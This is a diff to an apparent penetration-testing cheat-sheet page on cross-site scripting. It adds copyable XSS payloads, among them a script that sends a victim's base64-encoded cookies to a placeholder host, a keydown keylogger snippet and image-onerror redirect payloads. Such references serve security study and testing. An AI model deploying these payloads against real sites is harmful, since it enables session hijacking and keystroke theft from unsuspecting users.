@@ -40,23 +40,46 @@
 <div class="column" style="display: inline-block; text-align: left; background-color:gray;">
 <button onclick="document.location='/machete/offensive/web_penetration_testing/client_side_attacks.html'" class="round" style="float: left;">&lt;&lt;</button><br><br>
 <details>
+<summary>GENERAL TECHNIQUES</summary>
+	
+</details>	
+<details>
 <summary>REFLECTED TECHNIQUES</summary>
 <p><b>DESCRIPTION:</b> It is when data is retrieved in the webpage without any restriction. So it can be used to exfiltrate
 information, stole information, etc. </p>
 <p><b>COMMON TESTS:</b>
 
-<b>C1: </b><p id="RTA01"><mark>&lt;h1&gt;TEST&lt;/h1&gt;</mark></p>	
-<b>C2: </b><p id="RTA02"><mark>&lt;script&gt;alert('XSS');&lt;/script&gt;</mark></p>|| C1 & C2, NORMAL TEST TO KNOW IF VULNERABILITY EXIST	
+<b>C1: </b><mark  id="RTA01">&lt;h1&gt;TEST&lt;/h1&gt;</mark>	
+<b>C2: </b><mark id="RTA02">&lt;script&gt;alert('XSS');&lt;/script&gt;</mark> || C1 & C2, NORMAL TEST TO KNOW IF VULNERABILITY EXIST	
 
-<b>C3: </b><p id="RTA03"><mark>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</mark></p>|| NORMAL TEST TO RETRIEVE COOKIES
+<b>C3: </b><mark id="RTA03">&lt;script&gt;alert(document.cookie);&lt;/script&gt;</mark> || NORMAL TEST TO RETRIEVE COOKIES
 
-<b>C4: </b><p id="RTA04"><mark>&lt;script&gt;fecth('http://IP_ADDR/${btoa(document.cookie)}');&lt;/script&gt;</mark></p>|| STOLE ENCODED BASE64 COOKIE
+<b>C4: </b><mark id="RTA04">&lt;script&gt;fecth('http://IP_ADDR/${btoa(document.cookie)}');&lt;/script&gt;</mark> || STOLE ENCODED BASE64 COOKIE
 
 *for this to work, it is needed a python server or any listener to retrieve the content.<br>
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#RTA01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#RTA02')">.C2.</button>  | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#RTA03')">.C3.</button>  | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#RTA04')">.C4.</button> 
 	
 </p>
+<details>
+<summary>TEST VIA DEV TOOLS</summary>
+
+1. open dev tools in your browser
+2. type: <mark id="TDT01">alert(1)</mark> | <mark id="TDT02">print()</mark> | <mark id="TDT03">prompt("hello")</mark>
+
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT03')">.C3.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT004')">.C4.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT005')">.C5.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT006')">.C6.</button></p>
+
+<b><u>CREATE A LOG FUNCTION TO STORE/RETRIEVE DATA USING XSS</u></b>
+
+<b><u>step1></u></b>
+$ <mark id="TDT04">function logKey(event){console.log(event.key)}</mark>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT04')">.C1.</button>
+
+<b><u>step2></u></b>
+$ <mark id="TDT05">document.addEventListener('keydown', logKey)</mark>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT05')">.C1.</button>
+	
+</details>
 </details>
 <details>
 <summary>STORED TECHNIQUES</summary>
@@ -66,8 +89,20 @@ to exploit any user that loads the vulnerable page. </p>
 <details>
 <summary>DOM TECHNIQUES</summary>
 <p>DESCRIPTION: </p>
-</details>		
 
+<b><u>HOW TO KNOW IF DOM-BASED VULNERABILITY EXIST ?</u></b>
+
+One way, is to use the application as expected and open dev tools and inspect the network tab, if there's requests
+coming and going it means it is reflected or stored, if not, it means it is DOM-BASED. 
+
+<details>
+<summary>NORMAL TESTS</summary>
+
+1. &lt;img src=x onerror="prompt(1)"&gt;
+2. &lt;img src=x onerror="window.location.href="https://machetevault.github.io/machete""&gt;
+
+</details>	
+</details>		
 </div>
 </pre>
 <button onclick="document.location='/machete/offensive/web_penetration_testing/client_side_attacks.html'">GO BACK</button>
